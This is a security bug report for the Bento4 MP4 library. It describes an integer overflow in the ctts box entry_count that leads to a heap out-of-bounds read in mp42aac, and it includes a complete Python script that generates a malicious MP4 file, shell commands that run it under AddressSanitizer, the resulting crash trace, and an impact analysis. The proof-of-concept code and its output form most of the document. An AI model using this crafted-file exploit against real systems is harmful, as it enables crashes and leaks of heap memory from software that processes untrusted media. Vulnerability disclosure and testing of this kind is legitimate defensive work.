## Bug0: AP4_CttsAtom integer overflow causes heap buffer overflow on OOB read

In `AP4_CttsAtom::AP4_CttsAtom` in `Ap4CttsAtom.cpp`, the attacker-controlled `entry_count` field (a 32-bit unsigned integer read from a ctts box) is multiplied by the integer literal `8` without any bounds check, causing a 32-bit integer overflow that allocates a zero-byte heap buffer and allows a subsequent loop to perform out-of-bounds reads across the heap.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(fourcc, payload):
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload

def make_full_box(fourcc, version, flags, payload):
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return make_box(fourcc, header + payload)

def build_ftyp():
    data = b"isom" + struct.pack(">I", 0) + b"isom" + b"mp41"
    return make_box("ftyp", data)

def build_mvhd():
    identity_matrix = struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 1000) +
        struct.pack(">I", 0) +
        struct.pack(">I", 0x00010000) +
        struct.pack(">H", 0x0100) +
        b"\x00" * 10 +
        identity_matrix +
        b"\x00" * 24 +
        struct.pack(">I", 2)
    )
    return make_full_box("mvhd", 0, 0, data)

def build_tkhd():
    identity_matrix = struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 1) +
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        b"\x00" * 8 +
        struct.pack(">H", 0) +
        struct.pack(">H", 0) +
        struct.pack(">H", 0x0100) +
        struct.pack(">H", 0) +
        identity_matrix +
        struct.pack(">I", 0) +
        struct.pack(">I", 0)
    )
    return make_full_box("tkhd", 0, 3, data)

def build_mdhd():
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 44100) +
        struct.pack(">I", 0) +
        struct.pack(">H", 0x55C4) +
        struct.pack(">H", 0)
    )
    return make_full_box("mdhd", 0, 0, data)

def build_hdlr():
    data = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"\x00"
    return make_full_box("hdlr", 0, 0, data)

def build_smhd():
    return make_full_box("smhd", 0, 0, struct.pack(">HH", 0, 0))

def build_dref():
    url_entry = make_full_box("url ", 0, 1, b"")
    return make_full_box("dref", 0, 0, struct.pack(">I", 1) + url_entry)

def build_dinf():
    return make_box("dinf", build_dref())

def build_stsd():
    return make_full_box("stsd", 0, 0, struct.pack(">I", 0))

def build_stts():
    return make_full_box("stts", 0, 0, struct.pack(">I", 0))

def build_ctts_malicious():
    # entry_count = 0x20000000: entry_count*8 overflows 32 bits to 0,
    # allocating a 0-byte buffer, then the loop reads far past it
    TRIGGER_COUNT = 0x20000000
    return make_full_box("ctts", 0, 0, struct.pack(">I", TRIGGER_COUNT))

def build_stsz():
    return make_full_box("stsz", 0, 0, struct.pack(">II", 0, 0))

def build_stco():
    return make_full_box("stco", 0, 0, struct.pack(">I", 0))

def build_stbl():
    payload = (build_stsd() + build_stts() + build_ctts_malicious() +
               build_stsz() + build_stco())
    return make_box("stbl", payload)

def build_minf():
    return make_box("minf", build_smhd() + build_dinf() + build_stbl())

def build_mdia():
    return make_box("mdia", build_mdhd() + build_hdlr() + build_minf())

def build_trak():
    return make_box("trak", build_tkhd() + build_mdia())

def build_moov():
    return make_box("moov", build_mvhd() + build_trak())

def build_mdat():
    return make_box("mdat", b"")

mp4 = build_ftyp() + build_moov() + build_mdat()
with open("poc_input.mp4", "wb") as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x557fcd9ef094 bp 0x7ffd7177c130 sp 0x7ffd7177c120
READ of size 1 at 0x5020000000f1 thread T0
    #0 0x557fcd9ef093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x557fcd9f0087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker can trigger a heap buffer overflow out-of-bounds read by supplying a crafted MP4 file with an oversized `ctts` box `entry_count` field, causing the process to read arbitrary heap memory adjacent to a zero-byte allocation. The attack surface is any invocation of `mp42aac` on an untrusted MP4 file, requiring no authentication or special privileges. On memory-constrained systems this causes an immediate denial of service crash, while on systems with sufficient heap space it may expose sensitive heap contents through subsequent CTS offset calculations.
